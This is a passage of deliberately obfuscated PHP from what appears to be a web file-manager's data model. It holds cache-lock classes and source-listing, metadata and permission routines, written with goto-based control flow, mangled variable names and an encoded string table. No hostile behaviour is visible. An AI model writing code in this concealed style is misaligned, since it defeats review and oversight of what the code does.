remove($f¢†Ñò±Ü, $A¢ã³–Ñ± = false) { $aá·´ò‰Õù =& $_SERVER[Äº¡•ô™Ÿ]; $føÒäï“Œç = $this->listData($f¢†Ñò±Ü); if (!$føÒäï“Œç) { return; } if (!$A¢ã³–Ñ± && $føÒäï“Œç[$aá·´ò‰Õù[1080]] == $aá·´ò‰Õù[83]) { return !1; } return parent::remove($f¢†Ñò±Ü); } public function enable($eæ²Ù³—ê, $Có¶¬Ø™»ù) { return $this->update($eæ²Ù³—ê, array($_SERVER[Äº¡•ô™Ÿ][2440] => $Có¶¬Ø™»ù)); } public function run($FøÆ’ãÚğÓ) { return $this->update($FøÆ’ãÚğÓ, array($_SERVER[Äº¡•ô™Ÿ][2450] => time())); } } goto F™÷ÈÄ×»Ö; d„šŒ‡ˆØÊ: class CacheLockRedis { public function lock($eè¾Ê¬Á®§, $D®¨¯™Í¥ = 10) { $AÊÎëÍ²¹ò = Cache::init(); $bˆñ¢£Ãè = microtime(!0) + $D®¨¯™Í¥; while (microtime(!0) < $bˆñ¢£Ãè) { $d†ƒİğÔÆÀ = $AÊÎëÍ²¹ò->get($eè¾Ê¬Á®§); if (!$d†ƒİğÔÆÀ) { $EòÜİõôÇ = $AÊÎëÍ²¹ò->setLock($eè¾Ê¬Á®§, $bˆñ¢£Ãè, $D®¨¯™Í¥); if ($EòÜİõôÇ) { return !0; } } else { if ($d†ƒİğÔÆÀ < microtime(!0)) { $AÊÎëÍ²¹ò->set($eè¾Ê¬Á®§, $bˆñ¢£Ãè, $bˆñ¢£Ãè); if ($AÊÎëÍ²¹ò->get($eè¾Ê¬Á®§) === $d†ƒİğÔÆÀ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($dÜïÀ‚Áê) { return Cache::init()->get($dÜïÀ‚Áê); } public function unlock($AÌ”Ì¤âù) { return Cache::init()->remove($AÌ”Ì¤âù); } } class CacheLockMemcached { public function lock($e‘âá³²æº, $d‰Æš˜Ğ´Ó = 0) { $dçÀÅëİ”Ä = Cache::init(); $c¶òÈ¬Ë¬ = microtime(!0) + $d‰Æš˜Ğ´Ó; while (microtime(!0) < $c¶òÈ¬Ë¬) { $ağ„àæÜ› = $dçÀÅëİ”Ä->get($e‘âá³²æº); if (!$ağ„àæÜ› || $ağ„àæÜ› < microtime(!0)) { $e¿èÖÁ¯İ = $dçÀÅëİ”Ä->handle->add($e‘âá³²æº, $c¶òÈ¬Ë¬, $d‰Æš˜Ğ´Ó); if ($e¿èÖÁ¯İ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($EšÜÊñ‘‡) { return Cache::init()->get($EšÜÊñ‘‡); } public function unlock($dîË­“…”‰) { return Cache::init()->remove($dîË­“…”‰); } } class CacheLockDatabase { public function lock($A™ğîƒ‚ï’, $bÔç‰ñç‡¿ = 0) { $Cª¶•ò½Ôë = Model($_SERVER[Äº¡•ô™Ÿ][758]); $aëéì´ù÷¿ = microtime(!0) + $bÔç‰ñç‡¿; while (microtime(!0) < $aëéì´ù÷¿) { $C–õ‘‘÷Ù = $Cª¶•ò½Ôë->get($A™ğîƒ‚ï’); if (!$C–õ‘‘÷Ù || $C–õ‘‘÷Ù < microtime(!0)) { $E¢Ë’‰»½ = $Cª¶•ò½Ôë->set($A™ğîƒ‚ï’, $aëéì´ù÷¿); if ($E¢Ë’‰»½) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($c¦¼·èî—¹) { return Model($_SERVER[Äº¡•ô™Ÿ][758])->get($c¦¼·èî—¹); } public function unlock($aµè•†Í¶) { Model($_SERVER[Äº¡•ô™Ÿ][758])->remove($aµè•†Í¶); } } goto FÚƒÓªùÇ; E‰²¬óØåí: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\162\x63\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\141\x6d\145" => "\x69\157\x5f\x73\x6f\165\162\x63\145\137\155\145\164\141", "\155\145\164\x61\x46\x69\x65\154\144" => "\163\157\x75\x72\143\145\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\124\x69\x6d\145", "\x74\151\x6d\x65", "\x69\x6e\163\x65\162\164", "\x66\165\156\x63\x74\151\x6f\x6e"), array("\143\x72\145\141\x74\x65\124\x69\155\145", "\164\x69\x6d\x65", "\151\x6e\163\x65\162\x74", "\x66\165\x6e\143\x74\x69\x6f\x6e"), array("\166\151\x65\167\124\151\x6d\x65", "\164\151\x6d\x65", "\151\x6e\163\145\162\x74", "\146\165\156\x63\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($FÕğã¨é±Ÿ) { return $this->listSource(array($_SERVER[Äº¡•ô™Ÿ][365] => $FÕğã¨é±Ÿ)); } public function typeName($cŸóº„Íƒ) { static $d¹‡°“Ãã = array(self::TYPE_SYSTEM => "\163\171\x73\x74\145\x6d", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\147\x72\x6f\x75\x70"); return $d¹‡°“Ãã[$cŸóº„Íƒ . $_SERVER[Äº¡•ô™Ÿ][33]]; } public function sourceListInfo($bº–ºˆÔ†©, $bŞå¯ó¶öÊ = false) { goto AÛ…÷‚; f–ÍÜ„ºå: if (!$bº–ºˆÔ†©) { return array(); } $F„šêİ„…µ = $this->where(array($C¼”ª‚ø˜Ó[366] => array($C¼”ª‚ø˜Ó[7], $bº–ºˆÔ†©)))->select(); $this->_listDataApply($F„šêİ„…µ, $bŞå¯ó¶öÊ); goto cŒá½ÆÔã’; cŒá½ÆÔã’: return array_to_keyvalue($F„šêİ„…µ, $C¼”ª‚ø˜Ó[366]); goto A¤ƒ¥Ì‚² ; AÛ…÷‚: $C¼”ª‚ø˜Ó =& $_SERVER[Äº¡•ô™Ÿ]; $bº–ºˆÔ†© = $bº–ºˆÔ†© ? $bº–ºˆÔ†© : array(); $bº–ºˆÔ†© = array_filter(array_unique($bº–ºˆÔ†©)); goto f–ÍÜ„ºå; A¤ƒ¥Ì‚² : } public function pathInfoFilter($fó³£®Íè¡) { goto fÍ×ñÅÒ›Á; d‘Û¨ÔàøÔ: if (isset($fó³£®Íè¡[$E—ß¼Çª[373]]) && $fó³£®Íè¡[$E—ß¼Çª[373]][$E—ß¼Çª[374]] == -1) { $aÑ³›§³ªè = array_remove_value($aÑ³›§³ªè, $E—ß¼Çª[184]); $aÑ³›§³ªè = array_remove_value($aÑ³›§³ªè, $E—ß¼Çª[107]); $aÑ³›§³ªè = array_remove_value($aÑ³›§³ªè, $E—ß¼Çª[375]); $aÑ³›§³ªè = array_remove_value($aÑ³›§³ªè, $E—ß¼Çª[376]); $aÑ³›§³ªè = array_remove_value($aÑ³›§³ªè, $E—ß¼Çª[77]); $aÑ³›§³ªè = array_remove_value($aÑ³›§³ªè, $E—ß¼Çª[377]); } $fó³£®Íè¡ = array_field_key($fó³£®Íè¡, $aÑ³›§³ªè); return $fó³£®Íè¡; goto dï‡‰÷×«×; fÎÜÙ’­‡‡: $f¡Ÿ§šÍ’— .= $E—ß¼Çª[371]; $f¡Ÿ§šÍ’— .= $E—ß¼Çª[372]; $aÑ³›§³ªè = explode($E—ß¼Çª[47], $f¡Ÿ§šÍ’—); goto d‘Û¨ÔàøÔ; d²ÇìˆêŠõ: $fó³£®Íè¡[$E—ß¼Çª[368]] = $this->typeName($fó³£®Íè¡[$E—ß¼Çª[368]]); if ($fó³£®Íè¡[$E—ß¼Çª[367]] != 1) { $fó³£®Íè¡[$E—ß¼Çª[157]] = $fó³£®Íè¡[$E—ß¼Çª[369]]; unset($fó³£®Íè¡[$E—ß¼Çª[369]]); } $f¡Ÿ§šÍ’— = $E—ß¼Çª[370]; goto fÎÜÙ’­‡‡; fÍ×ñÅÒ›Á: $E—ß¼Çª =& $_SERVER[Äº¡•ô™Ÿ]; $fó³£®Íè¡[$E—ß¼Çª[75]] = KodIO::make($fó³£®Íè¡[$E—ß¼Çª[366]]); $fó³£®Íè¡[$E—ß¼Çª[29]] = $fó³£®Íè¡[$E—ß¼Çª[367]] == 1 ? $E—ß¼Çª[76] : $E—ß¼Çª[164]; goto d²ÇìˆêŠõ; dï‡‰÷×«×: } public function listUserFav() { goto A½á·ò–Ô½; eŒÍ¸Çå³ô: $dÙÚÇœÊŸˆ = array_to_keyvalue($dÙÚÇœÊŸˆ, $c–øŠ´çˆ[33], $c–øŠ´çˆ[75]); if ($dÙÚÇœÊŸˆ) { $CÊš±Ç–ÇÍ = $this->listSource(array($c–øŠ´çˆ[380] => array($c–øŠ´çˆ[381], $dÙÚÇœÊŸˆ))); } $CÊš±Ç–ÇÍ = array_to_keyvalue($CÊš±Ç–ÇÍ[$c–øŠ´çˆ[351]], $c–øŠ´çˆ[366]); goto B¬‚àãµ¤¸; B¬‚àãµ¤¸: foreach ($EêµÚ„Ü¸ as &$f×Ñè®„©) { $f×Ñè®„© = array($c–øŠ´çˆ[382] => $f×Ñè®„©[$c–øŠ´çˆ[364]], $c–øŠ´çˆ[383] => $f×Ñè®„©[$c–øŠ´çˆ[28]], $c–øŠ´çˆ[384] => $f×Ñè®„©[$c–øŠ´çˆ[75]], $c–øŠ´çˆ[385] => $f×Ñè®„©[$c–øŠ´çˆ[29]], $c–øŠ´çˆ[386] => $f×Ñè®„©[$c–øŠ´çˆ[184]], $c–øŠ´çˆ[387] => $f×Ñè®„©[$c–øŠ´çˆ[107]]); if ($f×Ñè®„©[$c–øŠ´çˆ[29]] == $c–øŠ´çˆ[379] && $CÊš±Ç–ÇÍ[$f×Ñè®„©[$c–øŠ´çˆ[75]]]) { $f×Ñè®„©[$c–øŠ´çˆ[388]] = $CÊš±Ç–ÇÍ[$f×Ñè®„©[$c–øŠ´çˆ[75]]]; } } return $EêµÚ„Ü¸; goto b¡‰ğ³ÖÏ; A½á·ò–Ô½: $c–øŠ´çˆ =& $_SERVER[Äº¡•ô™Ÿ]; $EêµÚ„Ü¸ = Model($c–øŠ´çˆ[378])->listData(); $dÙÚÇœÊŸˆ = array_filter_by_field($EêµÚ„Ü¸, $c–øŠ´çˆ[29], $c–øŠ´çˆ[379]); goto eŒÍ¸Çå³ô; b¡‰ğ³ÖÏ: } public function listUserTag($c¯™Ø²ìæ“) { goto dÓ…Æ…ï÷; dÓ…Æ…ï÷: $AÈ©À¡ô«ƒ =& $_SERVER[Äº¡•ô™Ÿ]; $aÃ¦æøˆ® = Model($AÈ©À¡ô«ƒ[389])->listData(); $E…ø×ªÀƒ = array_filter_by_field($aÃ¦æøˆ®, $AÈ©À¡ô«ƒ[390], $c¯™Ø²ìæ“); goto càÒÙ¨£; càÒÙ¨£: $E…ø×ªÀƒ = array_to_keyvalue($E…ø×ªÀƒ, $AÈ©À¡ô«ƒ[33], $AÈ©À¡ô«ƒ[75]); if (!$E…ø×ªÀƒ) { return array(); } $A®Šö¨ùë‰ = array($AÈ©À¡ô«ƒ[380] => array($AÈ©À¡ô«ƒ[381], $E…ø×ªÀƒ)); goto CÇÖ½›£„; CÇÖ½›£„: return $this->listSource($A®Šö¨ùë‰); goto DÀ„–³‡Ş—; DÀ„–³‡Ş—: } public function listUserRecycle() { $c¸÷ßê’…ë =& $_SERVER[Äº¡•ô™Ÿ]; $Fè‚‡¨ùÛ¯ = Model($c¸÷ßê’…ë[391])->listData(); if (!$Fè‚‡¨ùÛ¯) { return array(); } $D‹é§ÇÛ = array($c¸÷ßê’…ë[380] => array($c¸÷ßê’…ë[381], $Fè‚‡¨ùÛ¯), $c¸÷ßê’…ë[392] => 1); return $this->listSource($D‹é§ÇÛ); } public function listSource($BÇ¬Úä»¾•, $D ›…Ô—¥á = 3000) { goto b„‚Àœßóİ; eÅ¬« ßÚ: return $b›ÃƒÚÒéÊ; goto bŒÎ³×Ç¥; b„‚Àœßóİ: $bœÕ¨Ù™­ =& $_SERVER[Äº¡•ô™Ÿ]; if (!isset($BÇ¬Úä»¾•[$bœÕ¨Ù™­[393]])) { $BÇ¬Úä»¾•[$bœÕ¨Ù™­[393]] = 0; } $eù‡ÇÀõˆ‰ = $bœÕ¨Ù™­[394]; goto F½…µÏŒ¾˜; F½…µÏŒ¾˜: $b›ÃƒÚÒéÊ = $this->field($eù‡ÇÀõˆ‰)->_makeOrder()->where($BÇ¬Úä»¾•)->selectPage($D ›…Ô—¥á); $this->_listDataApply($b›ÃƒÚÒéÊ[$bœÕ¨Ù™­[351]]); $this->_listMake($b›ÃƒÚÒéÊ); goto eÅ¬« ßÚ; bŒÎ³×Ç¥: } protected function _makeOrder() { goto C”Ù’©¶Ôƒ; a¨ôÈœÅß: if ($aæàºÍÁŠÛ == $a‹šŒƒÌ•[28]) { } $c¬±†àçÃ„ = $a‹šŒƒÌ•[405] . $A¿˜¬¨È¾â[$aæàºÍÁŠÛ] . $a‹šŒƒÌ•[50] . $e©Œ­„àîè[$E­¨ÔîÂÈ]; return $this->order(rtrim(trim($c¬±†àçÃ„), $a‹šŒƒÌ•[47])); goto Bíí•Î²¿¼; bœ“Îº‡‡©: $E­¨ÔîÂÈ = Input::get($a‹šŒƒÌ•[404], $a‹šŒƒÌ•[7], $EÉ¼­ÉÌÓ, array_keys($e©Œ­„àîè)); if (!in_array($aæàºÍÁŠÛ, array_keys($A¿˜¬¨È¾â))) { $aæàºÍÁŠÛ = $a‹šŒƒÌ•[28]; } if (!in_array($E­¨ÔîÂÈ, array_keys($e©Œ­„àîè))) { $aæàºÍÁŠÛ = $a‹šŒƒÌ•[398]; } goto a¨ôÈœÅß; C”Ù’©¶Ôƒ: $a‹šŒƒÌ• =& $_SERVER[Äº¡•ô™Ÿ]; $c‚ÇÍÛÛ³Â = Model($a‹šŒƒÌ•[395])->get($a‹šŒƒÌ•[396]); $EÉ¼­ÉÌÓ = Model($a‹šŒƒÌ•[395])->get($a‹šŒƒÌ•[397]); goto eƒ”×Ô™‘; eƒ”×Ô™‘: $e©Œ­„àîè = array($a‹šŒƒÌ•[398] => $a‹šŒƒÌ•[399], $a‹šŒƒÌ•[400] => $a‹šŒƒÌ•[401]); $A¿˜¬¨È¾â = array($a‹šŒƒÌ•[28] => $a‹šŒƒÌ•[28], $a‹šŒƒÌ•[77] => $a‹šŒƒÌ•[77], $a‹šŒƒÌ•[157] => $a‹šŒƒÌ•[369], $a‹šŒƒÌ•[375] => $a‹šŒƒÌ•[375], $a‹šŒƒÌ•[402] => $a‹šŒƒÌ•[376], $a‹šŒƒÌ•[184] => $a‹šŒƒÌ•[184], $a‹šŒƒÌ•[107] => $a‹šŒƒÌ•[107]); $aæàºÍÁŠÛ = Input::get($a‹šŒƒÌ•[403], $a‹šŒƒÌ•[7], $c‚ÇÍÛÛ³Â, array_keys($A¿˜¬¨È¾â)); goto bœ“Îº‡‡©; Bíí•Î²¿¼: } protected function _listDataApplyItem($c„È…‚Ù, $f¥ùÜ¦Úó = false) { $C¿‰²ÔÁøŞ = array($c„È…‚Ù); $this->_listDataApply($C¿‰²ÔÁøŞ, $f¥ùÜ¦Úó); return $C¿‰²ÔÁøŞ[0]; } protected function _listDataApply(&$fí–ÏÆåŞ’, $a‚‡ÎßÕ¥ = false) { goto a‘±§Ä®ê; a‘±§Ä®ê: $CÏÅ¸ŠøíÑ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$fí–ÏÆåŞ’) { $fí–ÏÆåŞ’ = array(); return; } $dŸå¨Í³¥ = array_to_keyvalue($fí–ÏÆåŞ’, $CÏÅ¸ŠøíÑ[33], $CÏÅ¸ŠøíÑ[366]); goto fÜëéÊ¦”; BÓ¨•ºÊÔĞ: $this->_listAppendPath($fí–ÏÆåŞ’); $this->_listAppendAuth($fí–ÏÆåŞ’); $this->_listAppendSourceInfo($fí–ÏÆåŞ’, $dŸå¨Í³¥); goto A–õˆæ‚ÓÙ; A–õˆæ‚ÓÙ: $this->_listAppendUser($fí–ÏÆåŞ’); $this->_listFilterInfo($fí–ÏÆåŞ’, $a‚‡ÎßÕ¥); goto B±êâˆÄÅ’; fÜëéÊ¦”: $dŸå¨Í³¥ = array_unique($dŸå¨Í³¥); $this->_listSourceCache($fí–ÏÆåŞ’); if (!$a‚‡ÎßÕ¥) { $this->_listAppendMeta($fí–ÏÆåŞ’, $dŸå¨Í³¥); $this->_listAppendFileMeta($fí–ÏÆåŞ’, $dŸå¨Í³¥); $this->_listAppendChildren($fí–ÏÆåŞ’, $dŸå¨Í³¥); } goto BÓ¨•ºÊÔĞ; B±êâˆÄÅ’: } protected function _listSourceCache($c¼ÙóÏç) { $FÙÑ…œ±À =& $_SERVER[Äº¡•ô™Ÿ]; foreach ($c¼ÙóÏç as $cáÀ·Œ•ìä) { self::$cacheSourceInfo[$FÙÑ…œ±À[406] . $cáÀ·Œ•ìä[$FÙÑ…œ±À[366]]] = $cáÀ·Œ•ìä; } } protected function _listFilterInfo(&$E¥ÃÆâîˆ¿, $a„ùªÛ¨í¢ = false) { $a÷ôï•²ËÃ =& $_SERVER[Äº¡•ô™Ÿ]; foreach ($E¥ÃÆâîˆ¿ as &$B–“¥Ò ˜Ç) { $B–“¥Ò ˜Ç = $this->pathInfoFilter($B–“¥Ò ˜Ç); self::$cachePathInfo[$a÷ôï•²ËÃ[407] . intval($a„ùªÛ¨í¢) . $a÷ôï•²ËÃ[408] . $B–“¥Ò ˜Ç[$a÷ôï•²ËÃ[366]]] = $B–“¥Ò ˜Ç; } } protected function _listMake(&$E‰«Ç©…œ¬) { $F£ÛªøÃÊç =& $_SERVER[Äº¡•ô™Ÿ]; $E‰«Ç©…œ¬[$F£ÛªøÃÊç[74]] = array(); $E‰«Ç©…œ¬[$F£ÛªøÃÊç[73]] = array(); foreach ($E‰«Ç©…œ¬[$F£ÛªøÃÊç[351]] as $bÏÄ“¢†Ø±) { $FÓ‚ŠµØ´Ë = $bÏÄ“¢†Ø±[$F£ÛªøÃÊç[367]] == 1 ? $F£ÛªøÃÊç[74] : $F£ÛªøÃÊç[73]; $E‰«Ç©…œ¬[$FÓ‚ŠµØ´Ë][] = $bÏÄ“¢†Ø±; } unset($E‰«Ç©…œ¬[$F£ÛªøÃÊç[351]]); } protected function _listAppendMeta(&$EÙ¾¦ÍëÒƒ, $bæÂØñ¢ª…) { goto dÎÕĞÛê‘à; Bº¾´¢ƒÆ»: if (!$dïŠÂ½öóË) { return; } $A’ª°ôŸßÁ = array($AŠÅ‰ÌÎç†[411], $AŠÅ‰ÌÎç†[412]); $AÇÍ½¥ñÜ = array(); goto d‚§Š³Ÿ¼‘; dÎÕĞÛê‘à: $AŠÅ‰ÌÎç† =& $_SERVER[Äº¡•ô™Ÿ]; $f…µ¸ğæÁÚ = array($AŠÅ‰ÌÎç†[380] => array($AŠÅ‰ÌÎç†[381], $bæÂØñ¢ª…)); $dïŠÂ½öóË = Model($AŠÅ‰ÌÎç†[409])->field($AŠÅ‰ÌÎç†[410])->where($f…µ¸ğæÁÚ)->select(); goto Bº¾´¢ƒÆ»; d‚§Š³Ÿ¼‘: foreach ($dïŠÂ½öóË as $aÌÆ£ˆà·) { if (!isset($AÇÍ½¥ñÜ[$aÌÆ£ˆà·[$AŠÅ‰ÌÎç†[366]]])) { $AÇÍ½¥ñÜ[$aÌÆ£ˆà·[$AŠÅ‰ÌÎç†[366]]] = array(); } if (in_array($aÌÆ£ˆà·[$AŠÅ‰ÌÎç†[89]], $A’ª°ôŸßÁ)) { continue; } $AÇÍ½¥ñÜ[$aÌÆ£ˆà·[$AŠÅ‰ÌÎç†[366]]][$aÌÆ£ˆà·[$AŠÅ‰ÌÎç†[89]]] = $aÌÆ£ˆà·[$AŠÅ‰ÌÎç†[356]]; } foreach ($EÙ¾¦ÍëÒƒ as &$Aš¬µíØ‚) { $Aš¬µíØ‚[$AŠÅ‰ÌÎç†[413]] = !1; if (isset($AÇÍ½¥ñÜ[$Aš¬µíØ‚[$AŠÅ‰ÌÎç†[366]]])) { $Aš¬µíØ‚[$AŠÅ‰ÌÎç†[413]] = $AÇÍ½¥ñÜ[$Aš¬µíØ‚[$AŠÅ‰ÌÎç†[366]]]; } if ($this->fileIsLock($Aš¬µíØ‚) && $Aš¬µíØ‚[$AŠÅ‰ÌÎç†[373]]) { $A…òÁ²®È¶ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Aš¬µíØ‚[$AŠÅ‰ÌÎç†[373]][$AŠÅ‰ÌÎç†[374]] = AuthModel::authDisable($Aš¬µíØ‚[$AŠÅ‰ÌÎç†[373]][$AŠÅ‰ÌÎç†[374]], $A…òÁ²®È¶); $Aš¬µíØ‚[$AŠÅ‰ÌÎç†[373]][$AŠÅ‰ÌÎç†[414]][$AŠÅ‰ÌÎç†[373]] = $Aš¬µíØ‚[$AŠÅ‰ÌÎç†[373]][$AŠÅ‰ÌÎç†[374]]; } } goto bÅË¬Ÿ°»ˆ; bÅË¬Ÿ°»ˆ: } protected function _listAppendFileMeta(&$EÉÖ¥·’µà, $FÜäŠ³Ë¢¶) { goto E©•³‡©ç; B¯ëš‘åÑĞ: foreach ($EÉÖ¥·’µà as &$b‘Æƒà²Ì) { goto fÍäøËŸ§ ; BŸîê»Ó : $aÏˆ¯Ğî©[$f‹©•¦¯´[77]] = $b‘Æƒà²Ì[$f‹©•¦¯´[77]]; $aÏˆ¯Ğî©[$f‹©•¦¯´[28]] = $b‘Æƒà²Ì[$f‹©•¦¯´[28]]; self::$cacheFileInfo[$f‹©•¦¯´[421] . $fÍœ¹âÅß] = $aÏˆ¯Ğî©; goto c±Â±¸ŞÏ; A Úç·èÕ: if (isset($b‘Æƒà²Ì[$f‹©•¦¯´[159]][$f‹©•¦¯´[422]])) { $b‘Æƒà²Ì[$f‹©•¦¯´[422]] = json_decode($b‘Æƒà²Ì[$f‹©•¦¯´[159]][$f‹©•¦¯´[422]], !0); unset($b‘Æƒà²Ì[$f‹©•¦¯´[159]][$f‹©•¦¯´[422]]); } goto Bøîº­î°; fÍäøËŸ§ : $fÍœ¹âÅß = $b‘Æƒà²Ì[$f‹©•¦¯´[415]]; if (!$fÍœ¹âÅß || !isset($d¶éë¿“óË[$fÍœ¹âÅß])) { continue; } $aÏˆ¯Ğî© = $d¶éë¿“óË[$fÍœ¹âÅß]; goto BŸîê»Ó ; c±Â±¸ŞÏ: unset($d¶éë¿“óË[$fÍœ¹âÅß][$f‹©•¦¯´[75]]); $DÏê°Şè· = is_array($CéÑ±·éŠÃ[$fÍœ¹âÅß]) ? $CéÑ±·éŠÃ[$fÍœ¹âÅß] : array(); $b‘Æƒà²Ì[$f‹©•¦¯´[159]] = array_merge($DÏê°Şè·, $d¶éë¿“óË[$fÍœ¹âÅß]); goto A Úç·èÕ; Bøîº­î°: } goto f­ôİàà­; E©•³‡©ç: $f‹©•¦¯´ =& $_SERVER[Äº¡•ô™Ÿ]; $E™À°¦ëÖ­ = array_to_keyvalue($EÉÖ¥·’µà, $f‹©•¦¯´[33], $f‹©•¦¯´[415]); $E™À°¦ëÖ­ = array_filter(array_unique($E™À°¦ëÖ­)); goto b˜Æ‹’¿‘; b˜Æ‹’¿‘: if (!$E™À°¦ëÖ­) { return; } $eØ¡áø˜Š± = array($f‹©•¦¯´[416] => array($f‹©•¦¯´[381], $E™À°¦ëÖ­)); $BŸ¬©æô¯› = $f‹©•¦¯´[417]; goto E…Ä²ó; E…Ä²ó: $d¶éë¿“óË = Model($f‹©•¦¯´[418])->field($BŸ¬©æô¯›)->where($eØ¡áø˜Š±)->select(); $d¶éë¿“óË = array_to_keyvalue($d¶éë¿“óË, $f‹©•¦¯´[415]); $C´¦ÔãÛ©» = Model($f‹©•¦¯´[419])->field($f‹©•¦¯´[420])->where($eØ¡áø˜Š±)->select(); goto A˜¦ˆŒÎÍ; A˜¦ˆŒÎÍ: $C´¦ÔãÛ©» = $C´¦ÔãÛ©» ? $C´¦ÔãÛ©» : array(); $CéÑ±·éŠÃ = array(); foreach ($C´¦ÔãÛ©» as $Bäë’ŒÈæë) { if (!isset($CéÑ±·éŠÃ[$Bäë’ŒÈæë[$f‹©•¦¯´[415]]])) { $CéÑ±·éŠÃ[$Bäë’ŒÈæë[$f‹©•¦¯´[415]]] = array(); } $CéÑ±·éŠÃ[$Bäë’ŒÈæë[$f‹©•¦¯´[415]]][$Bäë’ŒÈæë[$f‹©•¦¯´[89]]] = $Bäë’ŒÈæë[$f‹©•¦¯´[356]]; } goto B¯ëš‘åÑĞ; f­ôİàà­: } protected function _listAppendSourceInfo(&$bÃÒ²ÂËì, $e˜âÔ»£•) { goto Fõ³©—­ŞÌ; Aé•õ«ÕÏ: $eàÕ«Ÿµæì = Model($fÈË…‚†£[389])->listData(); $d ²¹ª“ = Model($fÈË…‚†£[378])->listData(); $CƒÑè¤“Œã = Model($fÈË…‚†£[425])->listSimple(); goto a‰Æ‚©ÊÆ“; Fé¤ĞŠ±³¬: $FÂç›Ş‡ = array_to_keyvalue_group($CƒÑè¤“Œã, $fÈË…‚†£[366]); foreach ($bÃÒ²ÂËì as &$aÄåãÍÀ¿) { $aÄåãÍÀ¿[$fÈË…‚†£[388]] = array($fÈË…‚†£[426] => 0, $fÈË…‚†£[427] => 0, $fÈË…‚†£[428] => 0); if (isset($Cõ¾Ğ—¶£°[$aÄåãÍÀ¿[$fÈË…‚†£[366]]])) { $aÄåãÍÀ¿[$fÈË…‚†£[388]][$fÈË…‚†£[429]] = 1; $aÄåãÍÀ¿[$fÈË…‚†£[388]][$fÈË…‚†£[430]] = $Cõ¾Ğ—¶£°[$aÄåãÍÀ¿[$fÈË…‚†£[366]]][$fÈË…‚†£[28]]; } if (isset($e£¿ô·‡²†[$aÄåãÍÀ¿[$fÈË…‚†£[366]]])) { $aÄåãÍÀ¿[$fÈË…‚†£[388]][$fÈË…‚†£[431]] = array(); foreach ($e£¿ô·‡²†[$aÄåãÍÀ¿[$fÈË…‚†£[366]]] as $f¥ğ×Û—«â) { $Aõ„©¬…½ = $b†ÉÆÄ¬»«[$f¥ğ×Û—«â]; $aÄåãÍÀ¿[$fÈË…‚†£[388]][$fÈË…‚†£[431]][] = array($fÈË…‚†£[432] => $Aõ„©¬…½[$fÈË…‚†£[364]], $fÈË…‚†£[383] => $Aõ„©¬…½[$fÈË…‚†£[28]], $fÈË…‚†£[433] => $Aõ„©¬…½[$fÈË…‚†£[434]]); } } if (isset($FÂç›Ş‡[$aÄåãÍÀ¿[$fÈË…‚†£[366]]])) { $aÄåãÍÀ¿[$fÈË…‚†£[388]][$fÈË…‚†£[435]] = array(); foreach ($FÂç›Ş‡[$aÄåãÍÀ¿[$fÈË…‚†£[366]]] as $F­Ñ¤ë¥ï) { $aÄåãÍÀ¿[$fÈË…‚†£[388]][$fÈË…‚†£[435]] = array($fÈË…‚†£[436] => $F­Ñ¤ë¥ï[$fÈË…‚†£[437]], $fÈË…‚†£[438] => $F­Ñ¤ë¥ï[$fÈË…‚†£[439]], $fÈË…‚†£[440] => $F­Ñ¤ë¥ï[$fÈË…‚†£[366]], $fÈË…‚†£[441] => $F­Ñ¤ë¥ï[$fÈË…‚†£[442]], $fÈË…‚†£[443] => $F­Ñ¤ë¥ï[$fÈË…‚†£[444]]); } } } return $bÃÒ²ÂËì; goto f©µ‚ƒ›ƒŒ; a‰Æ‚©ÊÆ“: $b†ÉÆÄ¬»« = array_to_keyvalue($A¹òæÇ÷ç¶, $fÈË…‚†£[364]); $e£¿ô·‡²† = array_to_keyvalue_group($eàÕ«Ÿµæì, $fÈË…‚†£[75], $fÈË…‚†£[390]); $Cõ¾Ğ—¶£° = array_to_keyvalue($d ²¹ª“, $fÈË…‚†£[75]); goto Fé¤ĞŠ±³¬; Fõ³©—­ŞÌ: $fÈË…‚†£ =& $_SERVER[Äº¡•ô™Ÿ]; if (!defined($fÈË…‚†£[423])) { return; } $A¹òæÇ÷ç¶ = Model($fÈË…‚†£[424])->listData(); goto Aé•õ«ÕÏ; f©µ‚ƒ›ƒŒ: } protected function _listAppendChildren(&$eïùª…£ÍÁ, $eÎŒšã±×ô) { goto däî´±”å; b²åÖì¤ñÛ: foreach ($eïùª…£ÍÁ as &$cÂ¥ß›ã¦¡) { if ($cÂ¥ß›ã¦¡[$f¡öãĞĞ™[367]]) { unset($cÂ¥ß›ã¦¡[$f¡öãĞĞ™[369]]); $cÂ¥ß›ã¦¡[$f¡öãĞĞ™[189]] = intval($f­±¶¾Ùè»[$cÂ¥ß›ã¦¡[$f¡öãĞĞ™[366]] . $f¡öãĞĞ™[447]][$f¡öãĞĞ™[448]]); $cÂ¥ß›ã¦¡[$f¡öãĞĞ™[188]] = intval($f­±¶¾Ùè»[$cÂ¥ß›ã¦¡[$f¡öãĞĞ™[366]] . $f¡öãĞĞ™[449]][$f¡öãĞĞ™[448]]); } } goto Aòè‘ŒÃ §; c¢‡¨ñ›Çä: $E ÈñÂæÍ = 1024 * 50; $eïùª…£ÍÁ = is_array($eïùª…£ÍÁ) ? $eïùª…£ÍÁ : array(); $Dò™ª…À¿ = count($eïùª…£ÍÁ); goto AÙŸ·İçÆğ; AÙŸ·İçÆğ: $BÚšî¬ÙØ’ = $this->tablePrefix . $this->tableName; for ($BéêÎŸŒ’ø = 0; $BéêÎŸŒ’ø < $Dò™ª…À¿; $BéêÎŸŒ’ø++) { $E„¨Ã–Àªî = intval($eïùª…£ÍÁ[$BéêÎŸŒ’ø][$f¡öãĞĞ™[393]]); if ($eïùª…£ÍÁ[$BéêÎŸŒ’ø][$f¡öãĞĞ™[367]]) { $B®ÄÀá˜½‚ = $eïùª…£ÍÁ[$BéêÎŸŒ’ø][$f¡öãĞĞ™[366]]; $e‚—º«÷Æ± .= 